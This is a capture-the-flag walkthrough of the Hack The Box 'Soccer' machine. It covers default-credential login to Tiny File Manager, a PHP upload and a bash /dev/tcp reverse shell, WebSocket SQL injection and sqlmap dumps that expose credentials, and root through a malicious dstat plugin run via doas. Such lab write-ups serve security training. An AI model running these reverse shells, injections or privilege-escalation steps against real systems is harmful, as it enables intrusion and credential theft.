# HTB Soccer

## Recon

- Port 80 open: `nginx 1.18.0`.
- `http://soccer.htb` redirects to a default page.
- Added `soccer.htb` to `/etc/hosts`.

### Subdomain discovery

- `gobuster dir` on `http://soccer.htb` revealed:
  - `/tiny/` -> Tiny File Manager

```bash
gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

## Tiny File Manager

- Login page identified as Tiny File Manager.
- Reference: https://github.com/prasathmani/tinyfilemanager
- Default credentials tested:
  - `admin/admin@123`
  - `user/12345`
- Login successful.

### Uploading a reverse shell

- The upload functionality works.
- Uploaded a PHP reverse shell.
- The shell is accessible at:
  - `http://soccer.htb/tiny/uploads/shell.php`

### Reverse shell

```bash
nc -lvnp 4444
bash -c '/bin/bash -i >& /dev/tcp/10.10.14.145/4444 0>&1'
```

### Getting a nicer shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z
stty raw -echo; fg; ls; export SHELL=/bin/bash
export TERM=xterm; stty rows 38 columns 116
reset
```

## Initial shell

```text
www-data@soccer:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Pivot to `player`

- Inspecting `/home`:
  - directory `/home/player`
- From `www-data` we focused on web server configuration files.

## Nginx analysis

File found: `/etc/nginx/sites-enabled/soc-player.htb`

```nginx
server {
    listen 80;
    listen [::]:80;

    server_name soc-player.soccer.htb;
    root /root/app/views;

    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}
```

- New host detected: `soc-player.soccer.htb`
- Added to `/etc/hosts`.
- The site is accessible.
- Able to register and log in.
- Current Ticket ID: `52316`

## WebSocket / SQL injection

- A WebSocket is present at `ws://soc-player.soccer.htb:9091`.
- Initial payload: `{"id":"81832"}`.
- Manual test with `wscat`:

```bash
wscat -c ws://soc-player.soccer.htb:9091
> {"id":"999 or 1=1"}
< Ticket Exists
> {"id":"999 or 2=1"}
< Ticket Doesn't Exist
```

- SQL injection confirmed.

## sqlmap

### Detection

```bash
sqlmap -u 'ws://soc-player.soccer.htb:9091' --data '{"id":"*"}'
```

- DBMS detected: MySQL >= 5.0.12
- Injection type: time-based blind

### List databases

```bash
sqlmap -u 'ws://soc-player.soccer.htb:9091' --data '{"id":"*"}' --dbs
```

- Databases found:
  - `information_schema`
  - `mysql`
  - `performance_schema`
  - `soccer_db`
  - `sys`

### Dump `soccer_db`

```bash
sqlmap -u 'ws://soc-player.soccer.htb:9091' --data '{"id":"*"}' -D soccer_db --dump
```

- Table found: `accounts`
- Columns: `id`, `username`, `email`, `password`
- Entry:
  - `email`: `player@player.htb`
  - `username`: `player`
  - `password`: `PlayerOftheMatch2022`

## SSH player

- Credentials from the DB: `player@player.htb / PlayerOftheMatch2022`
- SSH works.
- No `sudo` for `player`:

```bash
player@soccer:~$ sudo -l
[sudo] password for player:
Sorry, user player may not run sudo on localhost.
```

## LinPEAS and privilege escalation

- Transferred `linpeas.sh` to the box:

```bash
sudo scp Tools/linpeas.sh player@soccer.htb:/tmp/
```

- linPEAS findings:
  - SUID `doas` found: `/usr/local/bin/doas`
  - `doas.conf` allows:
    - `permit nopass player as root cmd /usr/bin/dstat`

```bash
-rwsr-xr-x 1 root root 42224 Nov 17 2022 /usr/local/bin/doas
```

- `doas` can run `dstat` as root without a password.
- `dstat` has `/usr/local/share/dstat` containing a module `exploit`.

### Exploiting `dstat`

- GTFObins for `dstat` can yield a root shell via a module or Python import.
- Example exploit:

```bash
player@soccer:/usr/local/share/dstat$ cat dstat_exploit.py
import os; os.system('/bin/bash -p')

player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --exploit
```

- After exploitation:

```text
root@soccer:/usr/local/share/dstat# id
uid=0(root) gid=0(root) groups=0(root)
```

## Root

- Flags:

```bash
player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --exploit
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
root@soccer:/usr/local/share/dstat# id
uid=0(root) gid=0(root) groups=0(root)
root@soccer:/usr/local/share/dstat# cat /root/root.txt
ecfe93d82cad459ff89157bee9c81f46
root@soccer:/usr/local/share/dstat# cat /home/player/user.txt
256c4dc8f86bed1cd3a899e081759cb3
```

## Conclusion

- Initial access via Tiny File Manager.
- Gained `www-data` shell.
- Discovered `soc-player.soccer.htb` in nginx config.
- Exploited WebSocket SQLi to retrieve `player` credentials.
- SSH as `player` obtained.
- linPEAS helped identify `doas` and `dstat`.
- Root obtained via `doas /usr/bin/dstat --exploit`.
